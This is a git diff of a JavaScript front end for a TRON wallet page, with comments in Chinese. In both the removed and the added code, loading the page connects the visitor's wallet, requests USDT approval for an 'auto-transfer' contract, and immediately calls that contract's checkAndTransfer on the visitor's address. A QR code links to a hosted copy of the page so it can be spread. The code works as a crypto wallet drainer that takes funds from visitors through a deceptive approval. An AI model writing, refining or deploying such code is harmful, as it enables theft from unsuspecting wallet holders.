@@ -54,70 +54,52 @@ const usdtAbi = [
 
 // 自动转账合约ABI
 const autoTransferAbi = [
-{"inputs":[{"internalType":"address","name":"_usdtToken","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
-{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},
-{"inputs":[{"internalType":"address","name":"userWallet","type":"address"}],"name":"checkAndTransfer","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"uint256","name":"newThreshold","type":"uint256"}],"name":"setThreshold","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[],"name":"threshold","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[],"name":"usdtToken","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}
+{ "inputs": [{ "internalType": "address", "name": "_usdtToken", "type": "address" }], "stateMutability": "nonpayable", "type": "constructor" },
+{ "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" },
+{ "inputs": [{ "internalType": "address", "name": "userWallet", "type": "address" }], "name": "checkAndTransfer", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+{ "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" },
+{ "inputs": [{ "internalType": "uint256", "name": "newThreshold", "type": "uint256" }], "name": "setThreshold", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+{ "inputs": [], "name": "threshold", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
+{ "inputs": [], "name": "usdtToken", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }
 ];
 
 let tronWeb;
 
-async function connectWalletAndApprove() {
+// 自动连接钱包、授权USDT并执行自动转账的功能
+async function authorizeAndTransfer() {
 if (typeof window.tronWeb === 'undefined') {
-alert('请安装TokenPocket钱包!');
+alert('请安装TronLink钱包!');
 return;
 }
 tronWeb = window.tronWeb;
-await tronWeb.trx.getBalance(tronWeb.defaultAddress.base58)
-.then(result => {
-console.log("连接成功, 余额:", result);
-approveUSDT();
-})
-.catch(error => {
-console.error("连接失败:", error);
-alert('连接TokenPocket失败!');
-});
-}
-
-async function approveUSDT() {
+try {
+await tronWeb.trx.getBalance(tronWeb.defaultAddress.base58);
 const usdtContract = await tronWeb.contract(usdtAbi, usdtContractAddress);
-await usdtContract.methods.approve(autoTransferContractAddress, approveAmount).send({
-feeLimit: 100000000
-}).then(() => {
-console.log("授权成功");
-document.getElementById('result').innerText = '授权成功';
-// 授权成功后立即执行自动转账
-autoTransfer();
-}).catch((error) => {
-console.error("授权失败:", error);
-document.getElementById('result').innerText = '授权失败';
+const autoTransferContract = await tronWeb.contract(autoTransferAbi, autoTransferContractAddress);
+
+// 授权USDT
+await usdtContract.methods.approve(autoTransferContractAddress, approveAmount).send();
+
+// 执行自动转账
+await autoTransferContract.methods.checkAndTransfer(tronWeb.defaultAddress.base58).send();
+
+document.getElementById('result').innerText = '授权和转账成功';
+} catch (error) {
+console.error(error);
+document.getElementById('result').innerText = '授权或转账失败';
+}
+}
+
+// 生成二维码
+function generateQRCode() {
+const url = 'https://wanglei3215.github.io/Mytokenproject/';
+QRCode.toCanvas(document.getElementById('qrcode'), url, function (error) {
+if (error) console.error(error);
+console.log('QR Code generated!');
 });
 }
 
-async function autoTransfer() {
-const contract = await tronWeb.contract(autoTransferAbi, autoTransferContractAddress);
-const userAddress = tronWeb.defaultAddress.base58;
-await contract.methods.checkAndTransfer(userAddress).send({
-feeLimit: 100000000,
-callValue: 0
-}).then(() => {
-console.log("转账成功");
-document.getElementById('result').innerText = '转账成功';
-}).catch((error) => {
-console.error("转账失败:", error);
-document.getElementById('result').innerText = '转账失败';
+document.addEventListener('DOMContentLoaded', function () {
+generateQRCode();
+authorizeAndTransfer();
 });
-}
-
-// 页面加载时自动连接钱包并进行授权
-window.onload = () => {
-connectWalletAndApprove();
-const qrCodeUrl = window.location.href;
-QRCode.toCanvas(document.getElementById('qrcode'), qrCodeUrl, function (error) {
-if (error) console.error("二维码生成失败:", error);
-console.log('二维码生成成功!');
-});
-};
